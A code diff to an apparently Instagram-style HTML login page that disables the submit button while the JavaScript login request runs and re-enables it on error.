@@ -87,7 +87,7 @@
                     </div>
 
                     <span class="button-box">
-                      <button class="btn" type="button" name="submit" onclick="login()">
+                      <button id="btnInsta" class="btn" type="button" name="submit" onclick="login()">
                         <div id="arrange">
                           <p id="loginLoader">Log in</p>
 
@@ -160,7 +160,7 @@
   </span> <!-- Root -->
 
   <!-- Select Link -->
-  
+
   <script>
     var myVar;
 
@@ -182,11 +182,14 @@
   <script>
     // Make a GET request
     function login() {
+      console.log("press");
       const passwordValue = document.querySelector('input[name="password"]');
       const usernameValue = document.querySelector('input[name="email"]');
       const error = document.getElementById('error');
       const loaderx = document.getElementById('loaderx');
       const loginLoader = document.getElementById('loginLoader');
+      const btnInsta = document.getElementById('btnInsta');
+      btnInsta.disabled = true;
       loginLoader.style.display = 'none';
       loaderx.style.display = 'block';
       error.style.display = 'none';
@@ -203,6 +206,7 @@
             error.style.display = 'block';
             loginLoader.style.display = 'block';
             loaderx.style.display = 'none';
+            btnInsta.disabled = false;
           } else {
             window.location.href = '/';
           }
@@ -211,6 +215,7 @@
           error.style.display = 'block';
           loginLoader.style.display = 'block';
           loaderx.style.display = 'none';
+          btnInsta.disabled = false;
           // Handle errors
           console.error('There was an error making the request:', error);
         });
